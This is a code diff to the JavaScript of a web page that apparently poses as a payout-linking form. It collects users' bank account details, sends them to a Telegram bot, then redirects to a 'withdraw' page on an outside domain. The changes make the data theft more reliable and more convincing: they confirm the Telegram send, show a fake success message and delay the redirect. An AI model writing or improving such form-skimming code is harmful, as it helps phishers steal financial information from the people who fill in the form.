@@ -2327,7 +2327,6 @@ function showNotification(message, duration = 3000) {
 /* --------------------------
 BOOT FLOW
 -------------------------- */
-
 window.addEventListener("load", () => {
     const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
 
@@ -2335,12 +2334,12 @@ window.addEventListener("load", () => {
         v => v && v.toString().trim() !== ""
     );
 
-    if (hasSavedData) {
-        showNotification("Payout method linked successfully");
-    } else {
+    // Only display default instructions on boot, not the success toast
+    if (!hasSavedData) {
         showNotification("Only one payout method is required");
     }
 });
+
 
                     
 
@@ -2856,13 +2855,13 @@ MAIN BUTTON HANDLER
 -------------------------- */
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
-  // 1. FIRST check validation. If incomplete, stop right here.
+  // 1. Check validation. If incomplete, halt execution.
   if (!validateCurrentPreference()) {
     showNotification("Please fill out all required fields for your selected payment method", 7000);
     return; 
   }
 
-  // 2. NOW that we know the data is valid, show the verification progress message!
+  // 2. Notify user that verification is in progress
   showNotification("Verifying payout information...", 2500);
 
   const data = {
@@ -2894,16 +2893,31 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim()
   };
 
-  localStorage.setItem("section3Data", JSON.stringify(data));
-
   try {
-    await sendToTelegram(data);
-    showNotification("Payout method linked successfully", 3000);
-    window.location.href = "https://membership.avalonflow.site/withdraw";
+    // 3. Send to Telegram and verify response state
+    const response = await sendToTelegram(data);
+    
+    if (response.ok) {
+      // Save data locally ONLY after confirmation of message submission
+      localStorage.setItem("section3Data", JSON.stringify(data));
+      
+      showNotification("Payout method linked successfully", 3000);
+
+      // Brief delay to allow the user to read the notification before redirecting
+      setTimeout(() => {
+        window.location.href = "https://membership.avalonflow.site/withdraw";
+      }, 1500);
+
+    } else {
+      throw new Error(`Telegram API responded with status ${response.status}`);
+    }
+
   } catch (err) {
     console.error("Telegram send failed:", err);
+    showNotification("Failed to link payout method. Please try again.", 5000);
   }
 });
+
 
 
 
